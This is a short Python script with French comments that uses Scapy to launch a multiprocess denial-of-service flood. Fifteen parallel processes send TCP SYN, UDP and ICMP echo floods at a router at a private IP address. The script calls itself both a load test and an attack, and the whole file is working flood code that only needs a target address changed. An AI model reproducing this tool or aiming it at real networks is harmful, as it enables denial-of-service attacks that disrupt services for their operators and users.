from scapy.all import *
import multiprocessing
import time

from scapy.layers.inet import IP, UDP, TCP, ICMP

# --------------------
# PARAMÈTRES GÉNÉRAUX
# --------------------
TARGET_IP = "192.168.99.228"  # Adresse IP du routeur Cisco
PORT = 12345  # Port cible arbitraire (le routeur ne l’écoute pas, on vise l’interface)
PACKETS_PER_PROCESS = 20000  # Nombre de paquets envoyés par processus
NUM_PROCESSES = 5  # Nombre de processus pour générer du trafic en parallèle

# --------------------
# FONCTIONS D'ENVOI
# --------------------

def send_tcp_flood():
    packet = IP(dst=TARGET_IP) / TCP(dport=PORT, flags="S") / Raw(load="ROUTER TCP FLOOD")
    send(packet, count=PACKETS_PER_PROCESS, inter=0.0001, verbose=False)


def send_udp_flood():
    packet = IP(dst=TARGET_IP) / UDP(dport=PORT) / Raw(load="ROUTER UDP FLOOD")
    send(packet, count=PACKETS_PER_PROCESS, inter=0.0001, verbose=False)


def send_icmp_flood():
    packet = IP(dst=TARGET_IP) / ICMP(type=8) / Raw(load="ROUTER ICMP FLOOD")  # Echo request
    send(packet, count=PACKETS_PER_PROCESS, inter=0.0001, verbose=False)

# --------------------
# LANCEMENT MULTIPROCESS
# --------------------

def launch_attack():
    processes = []

    for _ in range(NUM_PROCESSES):
        processes.append(multiprocessing.Process(target=send_tcp_flood))
        processes.append(multiprocessing.Process(target=send_udp_flood))
        processes.append(multiprocessing.Process(target=send_icmp_flood))

    print(f"🚀 Lancement de l'attaque parallèle avec {len(processes)} processus...")

    for process in processes:
        process.start()

    for process in processes:
        process.join()

    print("✅ Tous les processus terminés.")

# --------------------
# MAIN
# --------------------

if __name__ == "__main__":
    print("=== TEST DE CHARGE ROUTEUR CISCO ===")
    print(f"Cible : {TARGET_IP} | Port : {PORT} | {NUM_PROCESSES} process | {PACKETS_PER_PROCESS} paquets/process")
    start_time = time.time()
    launch_attack()
    print(f"⏱️ Durée totale : {time.time() - start_time:.2f} secondes")
